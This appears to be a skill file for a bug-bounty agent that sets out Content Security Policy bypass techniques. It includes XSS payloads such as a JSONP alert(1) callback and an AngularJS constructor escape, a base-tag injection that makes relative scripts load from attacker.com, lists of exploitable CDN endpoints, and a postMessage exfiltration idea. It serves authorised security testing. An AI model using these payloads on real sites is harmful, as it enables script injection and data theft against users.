---
name: hunt-csp-bypass
description: CSP bypass matrix — strict-dynamic, JSONP, base-tag, dangling markup, trusted types.
keywords: [csp, content security policy, csp bypass, strict-dynamic, nonce, jsonp, base tag, dangling markup, trusted types]
---

# hunt-csp-bypass

## Triggers

"csp", "content-security-policy", "nonce", "strict-dynamic",
"trusted types".

## Phase 1 — read the policy

```bash
curl -sI https://target | grep -i content-security-policy
```

Look for:

- `script-src` directive (the main attack surface)
- `'unsafe-inline'` → direct `<script>` works
- `'unsafe-eval'` → `eval()` and `Function()` work
- `'strict-dynamic'` → only same-page-loaded scripts allowed
- `'nonce-XXX'` → only scripts with this nonce
- Allowed hosts: any `*.example.com`, third-party CDNs, JSONP-able

## Phase 2 — bypass families

| CSP | Bypass |
|---|---|
| `script-src 'self'` + JSONP on origin | `<script src=/jsonp?callback=alert(1)//>` |
| `script-src 'self'` + file upload on origin | Upload JS, reference via path |
| `script-src 'self' *.example.com` + subdomain takeover | Host JS on taken-over subdomain |
| `script-src 'nonce-XXX'` + dangling markup | Inject `<base href=//attacker.com>` so relative `<script src=/app.js>` becomes attacker.com |
| `script-src 'strict-dynamic'` + DOM clobbering | Clobber a trusted script-creating function |
| `script-src trusted-cdn.com` (CDNJS, ajax.googleapis.com etc.) | Use old AngularJS / vulnerable library on the CDN |
| `script-src 'unsafe-eval'` + AngularJS present | `<div ng-app>{{constructor.constructor('alert(1)')()}}</div>` |
| `default-src 'self'` but `script-src` missing | `default-src` covers script if `script-src` absent |
| Report-Only CSP | Not enforcing — full XSS still works |
| `frame-ancestors` only | Doesn't block XSS at all |
| Trusted Types enforced | Find `default` policy that escapes; or use `unsafe-eval` if allowed |

## Phase 3 — known JSONP / Angular CDN endpoints

| Host | Endpoint |
|---|---|
| `www.google.com` | `/complete/search?client=t&q=&callback=alert(1)` |
| `accounts.google.com` | login flows reflect via JSONP |
| `ajax.googleapis.com` | host an outdated AngularJS version |
| `cdnjs.cloudflare.com` | many old libs with eval gadgets |
| Various social SDKs | embedded callback params |

## Phase 4 — dangling-markup attack

When you have a partial HTML inject but no full `<script>`:

```html
<base href="https://attacker.com/">
```

Then any later `<script src="/app.js">` (relative) loads from
`attacker.com`. Nonce-protected `<script>` with **inline** content
still works, but relative external `<script src>` is hijacked.

## Phase 5 — postMessage to CSP-allowed iframe

If CSP allows `frame-src https://payments.example.com` and the
payments iframe has weak postMessage handling, attacker can exfil
via the trusted frame.

## Disclosed-report patterns

| Source | Pattern |
|---|---|
| H1 #1130901 | `strict-dynamic` defeated via DOM clobbering |
| Cure53 / Heyes research | `<base>` tag bypass |
| Lupin's "I'm calling about your car's extended warranty" CSP series | JSONP enumeration |
| CVE-2024-27291 (Imager) | CSP report-only misconfig |

## Never-submit fallbacks

- "CSP missing on `/some-page`" without an XSS to leverage → KILL
- Bypass on a Report-Only policy → DOWNGRADE (intentionally non-enforcing)

## See also

- `hunt-xss` — CSP bypass is meaningless without an XSS primitive
